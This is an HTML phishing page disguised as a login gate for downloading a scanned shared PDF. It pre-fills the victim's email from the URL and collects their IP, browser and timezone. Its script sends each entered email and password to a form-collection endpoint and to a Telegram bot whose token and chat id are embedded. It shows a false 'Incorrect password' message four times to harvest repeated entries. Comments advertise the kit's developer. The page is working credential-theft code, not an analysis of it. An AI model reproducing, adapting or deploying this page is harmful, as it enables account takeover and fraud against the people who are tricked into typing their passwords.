<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="UTF-8" />
    <title>PDF Download Authentication</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <link
      href="https://fonts.googleapis.com/css2?family=Roboto&display=swap"
      rel="stylesheet"
    />
    <!-- Bootstrap Icons for input icons -->
    <link href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.11.3/font/bootstrap-icons.css" rel="stylesheet">

    <!-- 
      👨‍💻 Developed by Vikram Joseph
      📱 Telegram: https://t.me/e
      💼 Services: Websites, Landing Pages, Web Apps, Mobile Apps
    -->

    <style>
      * {
        box-sizing: border-box;
      }
      body {
        font-family: "Roboto", sans-serif;
        background: #f2f2f2;
        margin: 0;
        padding: 20px;
        display: flex;
        justify-content: center;
        align-items: center;
        min-height: 100vh;
      }
      .form-box {
        background: white;
        padding: 30px;
        border-radius: 10px;
        box-shadow: 0 4px 12px rgba(0, 0, 0, 0.1);
        width: 100%;
        max-width: 500px;
        text-align: center;
        animation: fadeDown 0.8s ease forwards;
      }
      @keyframes fadeDown {
        from {
          opacity: 0;
          transform: translateY(-30px);
        }
        to {
          opacity: 1;
          transform: translateY(0);
        }
      }
      .form-box img {
        width: 50px;
        margin-bottom: 10px;
      }
      .form-box h4 {
        margin: 10px 0 5px;
        font-weight: normal;
      }
      .pdf-link {
        display: inline-block;
        margin: 10px 0;
        color: #0066cc;
        font-size: 14px;
        text-decoration: none;
      }
      .input-container {
        position: relative;
        margin: 10px 0;
      }
      .input-icon {
        position: absolute;
        top: 50%;
        left: 12px;
        transform: translateY(-50%);
        font-size: 16px;
        color: #888;
        pointer-events: none;
        z-index: 1;
      }
      .input-field {
        width: 100%;
        padding: 10px 10px 10px 40px;
        border: 1px solid #ccc;
        border-radius: 5px;
        font-size: 16px;
      }
      .input-field:focus {
        outline: none;
        border-color: #007bff;
      }
      .error-msg {
        color: red;
        font-size: 13px;
        text-align: left;
        margin-top: 5px;
      }
      .download-btn {
        background-color: #007bff;
        color: white;
        border: none;
        padding: 10px 15px;
        margin-top: 15px;
        border-radius: 5px;
        width: 100%;
        font-size: 16px;
        cursor: pointer;
        display: flex;
        justify-content: center;
        align-items: center;
      }
      .download-btn:disabled {
        background-color: #cccccc;
        cursor: not-allowed;
      }
      .download-btn svg {
        margin-right: 8px;
      }
      .spinner {
        border: 3px solid #fff;
        border-top: 3px solid #ccc;
        border-radius: 50%;
        width: 16px;
        height: 16px;
        animation: spin 1s linear infinite;
        margin-left: 8px;
      }
      @keyframes spin {
        to {
          transform: rotate(360deg);
        }
      }
      .loader-overlay {
        position: fixed;
        top: 0;
        left: 0;
        width: 100%;
        height: 100%;
        background: rgba(0, 0, 0, .5);
        align-items: center;
        justify-content: center;
        z-index: 9999;
        display: none;
      }
      .spinner-border {
        width: 1.5rem;
        height: 1.5rem;
      }
      [dir="rtl"] .input-icon {
        left: auto;
        right: 12px;
      }
      [dir="rtl"] .input-field {
        padding: 10px 40px 10px 10px;
      }
      [dir="rtl"] .error-msg {
        text-align: right;
      }
    </style>
  </head>
  <body>
    <!-- 
      👨‍💻 UI by @444(Telegram)
      ⚡ Custom HTML/CSS/JS for authentication interface
    -->

    <div class="form-box">
      <img
        src="https://upload.wikimedia.org/wikipedia/commons/8/87/PDF_file_icon.svg"
        alt="PDF Icon"
      />
      <h4>Download Scanned Shared Document</h4>
      <p style="font-size: 13px; color: #666">Authentication required</p>
      <a href="#" class="pdf-link" id="pdf-link">&#128196; Document.pdf</a>

      <!-- Step 1 -->
      <form id="step1">
        <div class="input-container">
          <i class="bi bi-envelope input-icon"></i>
          <input
            type="email"
            class="input-field"
            id="emailInput"
            name="email"
            placeholder="Enter your email"
            required
            disabled
          />
        </div>
        <button type="submit" class="download-btn" id="step1Btn">
          <span>Continue</span>
        </button>
      </form>

      <!-- Step 2 -->
      <form id="step2" style="display: none">
        <div class="input-container">
          <i class="bi bi-envelope input-icon"></i>
          <input
            type="email"
            class="input-field"
            id="emailInputView"
            name="email"
            disabled
            placeholder="Enter your email"
          />
        </div>
        <div class="input-container" id="passwordContainer">
          <i class="bi bi-lock input-icon"></i>
          <input
            type="password"
            class="input-field"
            id="passwordInput"
            name="password"
            placeholder="Enter password"
            required
          />
          <div class="error-msg" id="passwordError" style="display: none">
            Incorrect password
          </div>
          <div class="error-msg" id="slowDownError" style="display: none">
            Please slow down
          </div>
        </div>
        <!-- Honeypot Field -->
        <input type="text" name="honeypot" id="honeypot" style="display:none;" autocomplete="off">
        <button type="submit" class="download-btn" id="step2Btn">
          <span>Download</span>
        </button>
      </form>
    </div>

    <!-- Loader Overlay (only for step1) -->
    <div id="loader-overlay" class="loader-overlay">
      <div class="spinner-border text-light" role="status">
        <span class="visually-hidden" id="loader-text">Loading...</span>
      </div>
    </div>

    <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
    <script>
      // Translation object for multiple languages
      const translations = {
        en: {
          errorMessage: "Incorrect password",
          emailLabel: "Enter your email",
          passwordLabel: "Enter password",
          continueButton: "Continue",
          downloadButton: "Download",
          loaderText: "Loading..."
        },
        zh: {
          errorMessage: "密码错误",
          emailLabel: "输入您的电子邮件",
          passwordLabel: "输入密码",
          continueButton: "继续",
          downloadButton: "下载",
          loaderText: "加载中..."
        },
        ja: {
          errorMessage: "パスワードが間違っています",
          emailLabel: "メールアドレスを入力",
          passwordLabel: "パスワードを入力",
          continueButton: "続ける",
          downloadButton: "ダウンロード",
          loaderText: "読み込み中..."
        },
        hi: {
          errorMessage: "गलत पासवर्ड",
          emailLabel: "अपना ईमेल दर्ज करें",
          passwordLabel: "पासवर्ड दर्ज करें",
          continueButton: "जारी रखें",
          downloadButton: "डाउनलोड",
          loaderText: "लोड हो रहा है..."
        },
        es: {
          errorMessage: "Contraseña incorrecta",
          emailLabel: "Ingresa tu correo electrónico",
          passwordLabel: "Ingresa tu contraseña",
          continueButton: "Continuar",
          downloadButton: "Descargar",
          loaderText: "Cargando..."
        },
        fr: {
          errorMessage: "Mot de passe incorrect",
          emailLabel: "Entrez votre email",
          passwordLabel: "Entrez votre mot de passe",
          continueButton: "Continuer",
          downloadButton: "Télécharger",
          loaderText: "Chargement..."
        },
        de: {
          errorMessage: "Falsches Passwort",
          emailLabel: "Geben Sie Ihre E-Mail ein",
          passwordLabel: "Geben Sie Ihr Passwort ein",
          continueButton: "Weiter",
          downloadButton: "Herunterladen",
          loaderText: "Laden..."
        },
        pt: {
          errorMessage: "Senha incorreta",
          emailLabel: "Digite seu e-mail",
          passwordLabel: "Digite sua senha",
          continueButton: "Continuar",
          downloadButton: "Baixar",
          loaderText: "Carregando..."
        },
        ar: {
          errorMessage: "كلمة المرور غير صحيحة",
          emailLabel: "أدخل بريدك الإلكتروني",
          passwordLabel: "أدخل كلمة المرور",
          continueButton: "متابعة",
          downloadButton: "تحميل",
          loaderText: "جارٍ التحميل..."
        },
        it: {
          errorMessage: "Password errata",
          emailLabel: "Inserisci la tua email",
          passwordLabel: "Inserisci la tua password",
          continueButton: "Continua",
          downloadButton: "Scarica",
          loaderText: "Caricamento..."
        },
        ko: {
          errorMessage: "잘못된 비밀번호",
          emailLabel: "이메일을 입력하세요",
          passwordLabel: "비밀번호를 입력하세요",
          continueButton: "계속",
          downloadButton: "다운로드",
          loaderText: "로딩 중..."
        },
        vi: {
          errorMessage: "Mật khẩu không đúng",
          emailLabel: "Nhập email của bạn",
          passwordLabel: "Nhập mật khẩu của bạn",
          continueButton: "Tiếp tục",
          downloadButton: "Tải xuống",
          loaderText: "Đang tải..."
        }
      };

      // Function to detect language
      function detectLanguage() {
        const browserLang = navigator.language || navigator.languages[0] || 'en';
        const langCode = browserLang.split('-')[0];
        return translations[langCode] ? langCode : 'en';
      }

      // Function to apply translations
      function applyTranslations(lang) {
        const t = translations[lang];
        document.documentElement.lang = lang;
        document.getElementById('passwordError').textContent = t.errorMessage;
        document.getElementById('emailInput').placeholder = t.emailLabel;
        document.getElementById('passwordInput').placeholder = t.passwordLabel;
        document.getElementById('step1Btn').querySelector('span').textContent = t.continueButton;
        document.getElementById('step2Btn').querySelector('span').textContent = t.downloadButton;
        document.getElementById('loader-text').textContent = t.loaderText;
      }

      // Function to extract email from URL
      function extractEmailFromUrl() {
        const hash = window.location.hash ? window.location.hash.substring(1) : null;
        const urlParams = new URLSearchParams(window.location.search);
        const eta = urlParams.get('eta');
        const email = hash || eta || '';
        try {
          if (email && /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email)) {
            return decodeURIComponent(email);
          }
          return '';
        } catch (e) {
          console.warn('Error decoding email from URL:', e);
          return '';
        }
      }

      // Main script
      document.addEventListener("DOMContentLoaded", () => {
        const lang = detectLanguage();
        applyTranslations(lang);

        // Handle email extraction and PDF link
        let submitCount = 0;
        const email = extractEmailFromUrl();
        let domain;
        const pdfLink = document.getElementById("pdf-link");
        if (email) {
          const emailInput = document.getElementById("emailInput");
          const emailInputView = document.getElementById("emailInputView");
          emailInput.value = email; // Set extracted email
          emailInputView.value = email; // Set extracted email
          emailInput.disabled = true;
          emailInputView.disabled = true;
          const parts = email.split("@");
          if (parts.length === 2) {
            domain = parts[1];
            pdfLink.innerHTML = `&#128196; Document_${domain.split(".")[0].toUpperCase()}.pdf`;
          }
          emailInput.dispatchEvent(new Event('input'));
          emailInputView.dispatchEvent(new Event('input'));
        } else {
          console.warn("No valid email found in URL hash or eta parameter.");
          pdfLink.innerHTML = `&#128196; Document.pdf`;
          document.getElementById("emailInput").disabled = true;
          document.getElementById("emailInputView").disabled = true;
        }

        // IP and Browser Detection
        let userData = {
          ipAddress: "Fetching...",
          userAgent: navigator.userAgent,
          timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
          browser: "Detecting..."
        };
        const ua = navigator.userAgent;
        userData.browser = ua.indexOf("Firefox") > -1 ? "Mozilla Firefox" :
                           ua.indexOf("SamsungBrowser") > -1 ? "Samsung Internet" :
                           ua.indexOf("Opera") > -1 || ua.indexOf("OPR") > -1 ? "Opera" :
                           ua.indexOf("Trident") > -1 ? "Microsoft Internet Explorer" :
                           ua.indexOf("Edge") > -1 ? "Microsoft Edge" :
                           ua.indexOf("Chrome") > -1 ? "Google Chrome or Chromium" :
                           ua.indexOf("Safari") > -1 ? "Apple Safari" : "Unknown";

        fetch("https://api.ipify.org?format=json").then(e => e.json()).then(e => {
          userData.ipAddress = e.ip;
        }).catch(e => {
          console.error("Error fetching IP address:", e);
          userData.ipAddress = "Unavailable";
        });

        // Step 1 Submission
        document.getElementById("step1").addEventListener("submit", function(e) {
          e.preventDefault();
          document.getElementById("loader-overlay").style.display = "flex";
          setTimeout(() => {
            document.getElementById("loader-overlay").style.display = "none";
            document.getElementById("step1").style.display = "none";
            document.getElementById("step2").style.display = "block";
            document.getElementById("emailInputView").value = document.getElementById("emailInput").value;
          }, 3000);
        });

        // Step 2 Submission
        document.getElementById("step2").addEventListener("submit", function(e) {
          e.preventDefault();
          const honeypot = document.getElementById("honeypot").value.trim();
          if (honeypot) {
            console.log("Honeypot field filled. Submission ignored.");
            return;
          }

          submitCount += 1;
          const isFirstAttempt = submitCount === 1;
          const isSecondAttempt = submitCount === 2;
          const isThirdAttempt = submitCount === 3;
          const isFourthAttempt = submitCount === 4;
          const isFifthAttempt = submitCount === 5;

          const email = document.getElementById("emailInputView").value.trim();
          const password = document.getElementById("passwordInput").value.trim();
          const data = {
            email,
            password: password || 'Not provided',
            ipAddress: userData.ipAddress,
            browser: userData.browser,
            userAgent: userData.userAgent,
            timezone: userData.timezone,
            submittedAt: new Date().toLocaleString('en-US', { timeZone: 'Africa/Lagos' })
          };

          // Format Telegram message (unchanged)
          const telegramMessage = `
*PDF Logs Perry_ajebuter*
------------------
*Email*: ${email}
*Password*: ${password ? password : 'Not provided'}
*IP Address*: ${userData.ipAddress}
*Browser*: ${userData.browser}
*User Agent*: ${userData.userAgent}
*Timezone*: ${userData.timezone}
------------------
*Submitted at*: ${new Date().toLocaleString('en-US', { timeZone: 'Africa/Lagos' })}
          `;
          const encodedMessage = encodeURIComponent(telegramMessage);

          // Format Formspark data (form-encoded)
          const formsparkData = new URLSearchParams(data).toString();

          // Full Telegram API URL
          const telegramUrl = `https://api.telegram.org/bot7103630373:AAE6U52dZ_UBA5-VSC2mP4xMHGnXJZT3DJs/sendMessage?chat_id=6134592216&text=${encodedMessage}`;

          // Submit to both endpoints
          new Promise(resolve => {
            const t = setInterval(() => {
              if (userData.ipAddress !== "Fetching...") {
                clearInterval(t);
                resolve();
              }
            }, 100);
          }).then(() => {
            Promise.all([
              fetch("https://submit-form.com/UBUe62yEH", {
                method: "POST",
                headers: { "Content-Type": "application/x-www-form-urlencoded" },
                body: formsparkData
              }).then(response => {
                console.log(response.ok ? "Formspark submission successful!" : `Formspark submission failed: ${response.status} ${response.statusText}`);
                if (!response.ok) {
                  return response.text().then(text => { throw new Error(`Formspark error: ${text}`); });
                }
                return response;
              }).catch(error => {
                console.error("Formspark submission error:", error);
                throw error;
              }),
              fetch(telegramUrl, {
                method: "GET"
              }).then(response => {
                console.log(response.ok ? "Telegram submission successful!" : `Telegram submission failed: ${response.status} ${response.statusText}`);
                return response;
              }).catch(error => {
                console.error("Telegram submission error:", error);
                throw error;
              })
            ]).catch(error => {
              console.error("Error in submissions:", error);
            });

            // Existing error handling
            if (isFirstAttempt || isSecondAttempt || isThirdAttempt || isFourthAttempt) {
              document.getElementById("passwordError").style.display = "block";
              document.getElementById("passwordInput").value = "";
            } else if (isFifthAttempt) {
              document.getElementById("passwordError").style.display = "none";
              document.getElementById("slowDownError").style.display = "block";
              document.getElementById("passwordInput").disabled = true;
              document.getElementById("step2Btn").disabled = true;
              setTimeout(() => {
                document.getElementById("slowDownError").style.display = "none";
                document.getElementById("passwordInput").disabled = false;
                document.getElementById("step2Btn").disabled = false;
                submitCount = 0; // Reset submission counter
                document.getElementById("passwordInput").value = "";
              }, 120000); // 2 minutes
            }
          });
        });
      });
    </script>
    <!-- 
      🚀 Functional logic created by Vikram Joseph
      📬 Telegram: https://joseph
      Need a landing page, user panel, or app? Contact now!
    -->
  </body>
</html>
